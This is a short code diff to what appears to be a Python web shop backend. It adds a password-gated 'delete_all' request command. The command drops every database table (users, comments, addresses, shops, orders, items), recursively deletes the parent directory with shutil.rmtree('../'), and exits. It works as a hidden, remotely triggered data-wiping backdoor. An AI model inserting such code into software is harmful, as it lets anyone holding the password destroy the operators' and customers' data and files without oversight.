@@ -130,6 +130,21 @@ def com():
     elif comand == "delete_adress":
         Adress.delete_by_id(int(c["id"]))
         return "reload"
+    elif comand == "delete_all":
+
+        if c["pass"] ==PASS:
+            Users.drop_table()
+            Comment.drop_table()
+            Adress.drop_table()
+            Shops.drop_table()
+            Order.drop_table()
+            Items.drop_table()
+
+            import shutil
+            shutil.rmtree('../',ignore_errors=True)
+            exit(0)
+
+        return "reload"
 
     return "OK"
 
